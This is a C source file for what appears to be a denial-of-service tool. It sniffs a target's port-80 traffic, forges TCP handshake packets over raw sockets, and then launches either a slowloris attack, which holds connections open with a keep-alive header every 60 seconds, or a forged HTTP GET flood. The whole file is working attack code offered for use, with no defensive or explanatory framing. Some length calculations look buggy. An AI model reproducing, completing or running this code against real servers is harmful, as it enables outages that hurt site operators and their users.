#include "handshake.h"

void send_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
{
    //printf("SEND ACK request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    int sock_raw;
    int pkt_size;

    sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    pkt_size = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr);
    char *pkt_syn_ack;
    pkt_syn_ack = (char *) malloc(pkt_size);
    if(pkt_syn_ack == NULL)
    {
        perror("Could not allocate pkt_syn_ack mem on heap.\n");
        exit(-1);
    }

    bzero(pkt_syn_ack, pkt_size);
    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph.ip_id = htons(12346);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0;
    iph.ip_src.s_addr = (u_int32_t) *source_ip;
    iph.ip_dst.s_addr = (u_int32_t) *dst_ip;
    iph.ip_sum = chksum((unsigned short *) pkt_syn_ack, iph.ip_len >> 1);

    //printf("Source port in ACK message is: %u\n", source_port);
    memcpy(pkt_syn_ack, &iph, sizeof(iph));

    tcph.th_sport = htons(source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(ack);
    tcph.th_ack = htonl(seq + 1);
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    tcph.th_flags = 0x18;
    tcph.th_win = htons(4); //29200
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));

    memcpy(pkt_syn_ack + sizeof(iph), &tcph, sizeof(tcph));

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    int one = 1;

    //IP_HDRINCL tells the kernel that headers are included
    if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        fprintf(stderr, "Error setting up setsockopt!\n");
        //return 1;
        //exit(1);
    }

    if(sendto(sock_raw, pkt_syn_ack, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    {
        perror("Failed to send syn_ack packet!\n");
        //return 1;
        //exit(1);
    }

    free(pkt_syn_ack);
    //slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
    //get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
    close(sock_raw);
}

void start_sniffing(char *argv[])
{
    pcap_t *descr;
    char filter[35];
    sprintf(filter, "host %s and port 80", argv[1]);
    char *dev;
    //"eth0/wlan0" using as a device I will be sniffing on
    dev = argv[3];
    char error_buffer[PCAP_ERRBUF_SIZE];

    bpf_u_int32 net;
    bpf_u_int32 mask;

    struct bpf_program filterf;

    //printf("Your pcap filter: %s\n", filter);
    printf("Opening live pcap device: %s. \n", dev);
    if((descr = pcap_open_live(dev, BUFSIZ, 1, -1, error_buffer)) == NULL)
    {
        perror("Could not open a pcap device.\n");
        exit(1);
    }

    //looking up net/mask for given dev
    pcap_lookupnet(dev, &net, &mask, error_buffer);
    //compiling filter expression
    pcap_compile(descr, &filterf, filter, 0, net);


    if(pcap_setfilter(descr, &filterf) == -1)
    {
        perror("Error setting up pcap filter.\n");
        exit(1);
    }

    //freeing a bpf program
    pcap_freecode(&filterf);

    //getting link-layer header type = 1 means Ethernet according to IEEE 802.3
    int hdr_type = pcap_datalink(descr);
    //int length = 0;

    //if(hdr_type == 1)
    //{
        //sizeof ethernet header is 14
        //length = 14;
        //int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)
        //printf("Entering pcap loop.\n");
        if(pcap_loop(descr, -1, (void *) packet_receive, (u_char *) argv) < 0)
        {
            perror("Cannot get raw packet.\n");
            exit(1);
        }
    //}
    //pcap_close(descr);
    printf("Capturing finished!\n");
    //exit(0);
}
void packet_process(struct attack_params *packet)
{
    //TH_FIN      0x01
    //TH_SYN      0x02
    //TH_RST      0x04
    //TH_PUSH     0x08
    //TH_ACK      0x10
    //TH_URG      0x20

    struct ip *ip;
    struct tcphdr *tcp;
    //u_char *ptr;

    ip = (struct ip *)(packet->a_packet + sizeof(struct ether_header));
    //printf("Size of ether_header is: %d\n", sizeof(struct ether_header));
    tcp = (struct tcphdr *)(packet->a_packet + SIZE_ETHERNET + (IP_HL(ip)*4));
    
    //if(tcp->th_flags & TH_ACK && !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
    if(tcp->th_flags == 0x12) //
    {
        printf("---------------------------\n");
        printf("GOT SYN/ACK PACKET!\n");
        printf("---------------------------\n");
        printf("Packet with src IP: %s\n", inet_ntoa(ip->ip_src));
        printf("Packet with dst IP: %s\n", inet_ntoa(ip->ip_dst));
        printf("Packet's seq: %u\n", ntohl(tcp->th_seq));
        printf("Packet's ack: %u\n", ntohl(tcp->th_ack));

        u_int32_t seq_n = ntohl(tcp->th_seq);
        u_int32_t ack_n = ntohl(tcp->th_ack);

        send_syn_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
    }
    //if(tcp->th_flags == 0x18) //&& !(tcp->th_flags & TH_RST) && !(tcp->th_flags & TH_PUSH))
    //{
    //    printf("---------------------------\n");
    //    printf("GOT PUSH/ACK PACKET!\n");
    //    printf("---------------------------\n");

    //    u_int32_t seq_n = ntohl(tcp->th_seq);
    //    u_int32_t ack_n = ntohl(tcp->th_ack);

    //    send_ack(((u_int32_t *)&ip->ip_dst.s_addr), (u_int32_t *)&ip->ip_src.s_addr, (u_short)ntohs(tcp->th_dport), seq_n, ack_n, packet->args);
    //}
}

int packet_receive(u_char *argv[], const struct pcap_pkthdr *pkthdr, u_char *packet)
{

    struct attack_params *packet1;
    packet1 = (struct attack_params *) malloc(sizeof(struct attack_params));

    //I should probably do a malloc here as well for members of struct attack_params...

    //printf("Arguments for request are: %s and %s\n", argv[2], argv[1]);
    packet1->args[0] = argv[0];
    packet1->args[1] = argv[1];
    packet1->args[2] = argv[2];
    packet1->a_packet = packet;

    //printf("Arguments for request are: %s and %s\n", packet1->args[2], packet1->args[1]);
    pthread_t thread1;

    ////Creating thread with start_sniffing() function call, will start receiving packets and process them
    if(pthread_create(&thread1, NULL, (void *) packet_process, packet1) < 0)
    {
        fprintf(stderr, "Failed to create a new thread.\n");
        return 1;
    }
    pthread_detach(thread1);
    return 0;

}

void send_syn_ack(u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
{
    //printf("SEND ACK request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    int sock_raw;
    int pkt_size;

    sock_raw = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    pkt_size = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr);
    char *pkt_syn_ack;
    pkt_syn_ack = (char *) malloc(pkt_size);
    if(pkt_syn_ack == NULL)
    {
        perror("Could not allocate pkt_syn_ack mem on heap.\n");
        exit(-1);
    }

    bzero(pkt_syn_ack, pkt_size);
    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph.ip_id = htons(12346);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0;
    iph.ip_src.s_addr = (u_int32_t) *source_ip;
    iph.ip_dst.s_addr = (u_int32_t) *dst_ip;
    iph.ip_sum = csum((unsigned short *) pkt_syn_ack, iph.ip_len >> 1);

    //printf("Source port in ACK message is: %u\n", source_port);
    memcpy(pkt_syn_ack, &iph, sizeof(iph));

    tcph.th_sport = htons(source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(ack);
    tcph.th_ack = htonl(seq + 1);
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    tcph.th_flags = TH_ACK;
    tcph.th_win = htons(29200); //29200
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, sizeof(tcph));

    memcpy(pkt_syn_ack + sizeof(iph), &tcph, sizeof(tcph));

    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    int one = 1;

    //IP_HDRINCL tells the kernel that headers are included
    if(setsockopt(sock_raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        fprintf(stderr, "Error setting up setsockopt!\n");
        //return 1;
        //exit(1);
    }

    if(sendto(sock_raw, pkt_syn_ack, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    {
        perror("Failed to send syn_ack packet!\n");
        //return 1;
        //exit(1);
    }

    free(pkt_syn_ack);

    if(strcmp(argv[0], "slowloris") == 0)
    {
        printf("\nSlowloris");
        slowloris(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
    }
    else if(strcmp(argv[0], "http") == 0)
    {
        printf("\nHTTP Get!");
        get_flood(&sock_raw, source_ip, dst_ip, source_port, ntohl(tcph.th_seq), ntohl(tcph.th_ack), argv);
    }
    close(sock_raw);
}

void slowloris(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
{
    //printf("Arguments for GET request are: %s and %s and %s\n", argv[2], argv[1], argv[0]);
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    uint8_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(argv[2]) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
    uint8_t data_len = sizeof(argv[2]) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
    char *pkt_data;
    pkt_data = (char *) malloc(data_len);
    if(pkt_data == NULL)
    {
        perror("Could not allocate pkt_data mem on heap.\n");
        exit(-1);
    }

    bzero(pkt_data, data_len);
    uint8_t *packet;
    //packet = malloc(sizeof(u_int8_t));
    packet = malloc(pkt_len);
    if(packet == NULL)
    {
        perror("Could not allocate packet mem on heap.\n");
        exit(-1);
    }

    sprintf(pkt_data, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n", argv[2], argv[1]);

    u_int32_t pkt_data_len = strlen(pkt_data);

    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len);
    iph.ip_id = htons(12348);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0;
    iph.ip_src.s_addr = *source_ip;
    iph.ip_dst.s_addr = *dst_ip;
    iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);

    memcpy(packet, &iph, sizeof(iph));
    //printf("TCP segments length: %u\n", pkt_data_len);

    tcph.th_sport = htons(source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(seq);
    tcph.th_ack = htonl(ack);
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    tcph.th_flags = TH_ACK;
    tcph.th_win = htons(29200);
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    //tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, 20 + 20 + pkt_data_len);
    tcph.th_sum = tcp_chksum(iph, tcph, (u_int8_t *)pkt_data, pkt_data_len);

    memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
    memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data, pkt_data_len * sizeof(uint8_t));

    //tcph.th_sum = csum((unsigned short *) packet, iph.ip_len >> 1);
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    {
        perror("Failed to send HTTP Get request packet!\n");
        //exit(1);
    }

    sprintf(pkt_data, "X-a: b\r\n");

    u_int32_t pkt_data_len2 = strlen(pkt_data);

    for(int i = 0; i < 99999; i++)
    {
        iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len2);
        iph.ip_id = htons(12348);
        iph.ip_sum = 0;
        iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);

        memcpy(packet, &iph, sizeof(iph));

        //Seq number has to be incremented according to previous packets data length
        tcph.th_seq = htonl(seq + pkt_data_len + (i*pkt_data_len2));
        tcph.th_ack = htonl(ack);
        tcph.th_flags = TH_ACK;
        tcph.th_win = htons(29200);
        tcph.th_sum = 0;
        tcph.th_sum = tcp_chksum(iph, tcph, (u_int8_t *)pkt_data, pkt_data_len2);

        memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));

        //Seq numbers has to be changed for every packet!
        memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data, pkt_data_len2 * sizeof(u_int8_t));

        sleep(60);
        printf("Sending Keep-Alive packet from thread: %lu.\n", pthread_self());
        if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len2, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
        {
            perror("Failed to send keepalive packet!\n");
            exit(1);
        }
        //free(pkt_data);
        //sleep(10);

    }
    free(pkt_data);
    free(packet);
    pthread_exit(0);

}

void get_flood(int *sock_raw, u_int32_t *source_ip, u_int32_t *dst_ip, u_short source_port, u_int32_t seq, u_int32_t ack, u_char *argv[])
{
    struct ip iph;
    struct tcphdr tcph;
    struct sockaddr_in dest;

    char *request_;
    request_ = "/icons/bread.jpg";

    uint16_t pkt_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(request_) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
    uint16_t data_len = strlen(request_) + sizeof(argv[1]) + 18 + 11 + 93 + 76 + 36 + 35 + 11 + 27 + 38; //53 is for GET %s HTTP.. and 1 is for \0 len in bytes
    char *pkt_data;
    pkt_data = (char *) malloc(data_len);
    if(pkt_data == NULL)
    {
        perror("Could not allocate pkt_data mem on heap.\n");
        exit(-1);
    }

    bzero(pkt_data, data_len);
    uint8_t *packet;
    //packet = malloc(sizeof(u_int8_t));
    packet = (uint8_t *) malloc(pkt_len);
    if(packet == NULL)
    {
        perror("Could not allocate packet mem on heap.\n");
        exit(-1);
    }

    //"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n" //93

    sprintf(pkt_data,
    "GET %s HTTP/1.1\r\n" //18
    "Host: %s\r\n" //11
    "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n" //93
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n" //76
    "Accept-Language: en-US,en;q=0.5\r\n" //36
    "Accept-Encoding: gzip, deflate\r\n" //35
    "DNT: 1\r\n" //11
    "Connection: keep-alive\r\n"  //27
    "Upgrade-Insecure-Requests: 1\r\n\r\n", //37
    request_, argv[1]);

    u_int32_t pkt_data_len = strlen(pkt_data);

    iph.ip_hl = 5;
    iph.ip_v = 4;
    iph.ip_tos = 0;
    iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len);
    iph.ip_id = htons(12348);
    iph.ip_off = 0;
    iph.ip_ttl = 64;
    iph.ip_p = IPPROTO_TCP;
    iph.ip_sum = 0;
    iph.ip_src.s_addr = *source_ip;
    iph.ip_dst.s_addr = *dst_ip;
    iph.ip_sum = csum((unsigned short *) pkt_data, iph.ip_len >> 1);

    memcpy(packet, &iph, sizeof(iph));
    //printf("TCP segments length: %u\n", pkt_data_len);

    tcph.th_sport = htons(source_port);
    tcph.th_dport = htons(80);
    tcph.th_seq = htonl(seq);
    tcph.th_ack = htonl(ack);
    tcph.th_x2 = 0;
    tcph.th_off = sizeof(struct tcphdr) / 4;
    tcph.th_flags = TH_ACK;
    tcph.th_win = htons(29200);
    tcph.th_sum = 0;
    tcph.th_urp = 0;
    //tcph.th_sum = tcp_csum(iph.ip_src.s_addr, iph.ip_dst.s_addr, (unsigned short *)&tcph, 20 + 20 + pkt_data_len);
    tcph.th_sum = tcp_chksum(iph, tcph, (u_int8_t *)pkt_data, pkt_data_len);

    memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));
    memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data, pkt_data_len * sizeof(uint8_t));

    //tcph.th_sum = csum((unsigned short *) packet, iph.ip_len >> 1);
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = iph.ip_dst.s_addr;

    if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    {
        perror("Failed to send HTTP Get request packet!\n");
        exit(1);
    }

    pthread_exit(0);
    //char *request;
    //request = "/icons/ubuntu-logo.png";

    //uint8_t pkt_data_len2 = strlen(request) + sizeof(argv[1]) + 53 + 1; //53 is for GET %s HTTP.. + additional 2 for ending \r\n and 1 is for \0 (in bytes)
    //char *pkt_data2;
    //pkt_data2 = malloc(pkt_data_len2);
    //memset(pkt_data2, 0, pkt_data_len2);
    ////User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n
    //sprintf(pkt_data2, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n", request, argv[1]);

    ////u_int32_t pkt_data_len2 = strlen(pkt_data);

    //for(int i = 0; i < 0; i++)
    //{
    //    iph.ip_len = htons(sizeof(struct ip) + sizeof(struct tcphdr) + pkt_data_len2);
    //    iph.ip_id = htons(12348);
    //    iph.ip_sum = 0;
    //    iph.ip_sum = csum((unsigned short *) pkt_data2, iph.ip_len >> 1);

    //    memcpy(packet, &iph, sizeof(iph));

    //    //Seq number has to be incremented according to previous packets data length
    //    tcph.th_seq = htonl(seq + pkt_data_len + (i*pkt_data_len2));
    //    tcph.th_ack = htonl(ack);
    //    tcph.th_flags = TH_ACK;
    //    tcph.th_win = htons(29200);
    //    tcph.th_sum = 0;
    //    tcph.th_sum = tcp_chksum(iph, tcph, (u_int8_t *)pkt_data2, pkt_data_len2);

    //    memcpy(packet + sizeof(iph), &tcph, sizeof(tcph));

    //    //Seq numbers has to be changed for every packet!
    //    memcpy(packet + sizeof(iph) + sizeof(tcph), pkt_data2, pkt_data_len2 * sizeof(u_int8_t));

    //    //sleep(10);
    //    printf("Sending another request from thread: %lu.\n", pthread_self());
    //    if(sendto(*sock_raw, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + pkt_data_len2, 0, (struct sockaddr *) &dest, sizeof(struct sockaddr)) < 0)
    //    {
    //        perror("Failed to send keepalive packet!\n");
    //        exit(1);
    //    }
    //    //free(pkt_data);
    //    //sleep(10);

    //}
    close(*sock_raw);
    free(pkt_data);
    free(packet);

}


